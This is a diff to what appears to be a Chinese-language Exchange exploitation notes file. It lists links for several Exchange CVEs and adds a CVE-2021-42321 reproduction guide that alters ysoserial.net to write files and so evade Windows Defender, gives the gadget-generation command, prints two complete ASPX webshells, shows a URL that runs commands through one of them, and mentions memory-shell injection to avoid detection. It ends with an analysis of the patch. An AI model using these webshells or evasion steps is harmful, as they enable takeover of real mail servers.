@@ -283,6 +283,31 @@ Content-Length: 327
  - ![](pics/proxytoken5.png)
  - ![](pics/proxytoken6.png)
 
+# CVE-2018-8581
+## CVE-2018-8581 part links
+
+ - [Exchange2domain](https://github.com/Ridter/Exchange2domain)
+
+
+# CVE-2018-8302
+## CVE-2018-8302 part links
+
+ - []()
+
+# CVE-2020-0688
+## CVE-2020-0688 part links
+
+ - [CVE-2020-0688-Exchange-远程代码执行分析及复现](https://fdlucifer.github.io/2020/10/12/cve-2020-0688/)
+ - [Ridter/cve-2020-0688](https://github.com/Ridter/cve-2020-0688/)
+
+# CVE-2020-17144
+## CVE-2020-17144 part links
+
+ - [CVE-2020-17144漏洞分析与武器化](https://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html)
+ - [CVE-2020-17144 zcgonvh github exp](https://github.com/zcgonvh/CVE-2020-17144)
+
+
+
 # Exchange Authenticated RCE CVE-2021-42321
 ## CVE-2021-42321 part links
 
@@ -295,12 +320,6 @@ Content-Length: 327
  - [Exchange 反序列化漏洞分析（一）](https://mp.weixin.qq.com/s/QSE4trL-AOgvChJ8UTp7OQ)
  - vuln version & patched version go to [How Tanium Can Help with the November 2021 Exchange Vulnerabilities (CVE-2021-42321)](https://community.tanium.com/s/article/How-Tanium-Can-Help-with-the-November-2021-Exchange-Vulnerabilities-CVE-2021-42321)
  - [exch_CVE-2021-42321](https://github.com/7BitsTeam/exch_CVE-2021-42321)
-
-``` bash
-TypeConfuse链改为写入文件，bypass windows definder禁用w3wp.exe启动进程。
-将此文件覆盖ysoserial.net原始文件，重新编译即可。
-```
-
  - [CVE-2021-42321-天府杯Exchange 反序列化漏洞分析](https://www.wangan.com/p/7fygf33f38821d6b)
  - [CVE-2021-42321_poc.py](./CVE-2021-42321_poc.py)
 
@@ -309,12 +328,104 @@ Exchange 2016 CU 21,22 and Exchange 2019 CU 10,11. This means the only recent la
 1. Create UserConfiguration with BinaryData as our Gadget Chain
 2. Request to EWS for GetClientAccessToken to trigger the Deserialization
 
-change DisableActivitySurrogateSelectorTypeCheck to True to overcome the limitation of .NET and later inject DLL to achieve mem-shell with Jscript to bypass the detection
+ - vulnerable exchange versions
+
+``` bash
+Exchange Server 2016 CU22 <= Oct21SU 15.1.2375.12 15.01.2375.012
+Exchange Server 2016 CU21 <= Oct21SU 15.1.2308.15 15.01.2308.015
+Exchange Server 2019 CU11 <= Oct21SU 15.2.986.9 15.02.0986.009
+Exchange Server 2019 CU10 <= Oct21SU 15.2.922.14 15.02.0922.014
+```
 
 ## 漏洞详细复现
+### 直接修改ysoserial.net为写入aspx webshell
+
+实际在利用的过程中遇到的500错误，原因是w3wp进程启动进程被Definder拦截了。这样的话只要修改ysoserial的代码功能为写文件即可利用。
+
+修改后[TypeConfuseDelegateGenerator](./exch_CVE-2021-42321/TypeConfuseDelegateGenerator.cs)
+
+ - ![](./pics/TypeConfuseDelegateGenerator.png)
+
+与原来的[TypeConfuseDelegateGenerator-origin](./exch_CVE-2021-42321/TypeConfuseDelegateGenerator-origin.cs)对比
+
+ - ![](./pics/TypeConfuseDelegateGenerator1.png)
+
+``` bash
+TypeConfuse链改为写入文件，bypass windows definder禁用w3wp.exe启动进程。
+将此文件覆盖ysoserial.net原始文件，重新编译即可。
+```
+
+然后运行如下命令生成gadget chain:
+
+``` bash
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "1" -t
+```
+
+替换原poc中的gadget，即可成功写入webshell
+
+ - ![](./pics/TypeConfuseDelegateGenerator1.png)
+
+修改了原poc，添加了写入如下两种shell的gadget chain:
+
+ - luci.aspx
+
+``` bash
+a<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>
+```
+
+ - atobshell.aspx
+
+``` bash
+a<%@ Page Language=\'JScript\' Debug=\'true\'%><%@Import Namespace=\'System.IO\'%><%File.WriteAllBytes(Request[\'b\'], Convert.FromBase64String(Request[\'a\']));%>
+```
+
+ - [CVE-2021-42321_shell_write_exp.py](./CVE-2021-42321_shell_write_exp.py)
+
+运行脚本，成功写入两个webshell，方便后续各种操作
+
+ - ![](./pics/TypeConfuseDelegateGenerator2.png)
+
+ - ![](./pics/TypeConfuseDelegateGenerator3.png)
+
+``` bash
+view-source:https://192.168.186.135/aspnet_client/luci.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
+```
+
+ - ![](./pics/TypeConfuseDelegateGenerator4.png)
+
+### 植入内存马
+
+change DisableActivitySurrogateSelectorTypeCheck to True to overcome the limitation of .NET and later inject DLL to achieve mem-shell with Jscript to bypass the detection
 
 
 
+
+
+
+### 修复
+
+KB5007409得到修复，最终反序列化的地方, 此处
+
+ - ![](./pics/repair.png)
+
+this.formatter为IClientExtensionCollectionFormatter的实现，仅剩
+
+``` bash
+Microsoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream):
+    Collection
+```
+
+1. TypeConfuseDelegate 链
+
+(1). 初始化 Formatter 的 Binder 属性时，将一个恶意类置入了白名单，导致内置的黑名单过滤失效。
+
+(2). ChainedSerializationBinder 黑名单中某个类拼写错误，导致内置的黑名单过滤失效。
+
+ClientExtensionCollectionFormatter.Deserialize() 改为使用 ExchangeBinaryFormatterFactory.CreateBinaryFormatter() 创建 Formatter 再反序列化数据，并且其 allowedTypes 设为空，而不是直接使用 TypedBinaryFormatter，甚至直接删除了 TypedBinaryFormatter 类。
+
+2. ClaimsPrincipal 链
+
+开发人员把类名写错，System.Security.ClaimsPrincipal 的正确写法应该是 System.Security.Claims.ClaimsPrincipal,直接改为正确的类名。
 
 
 
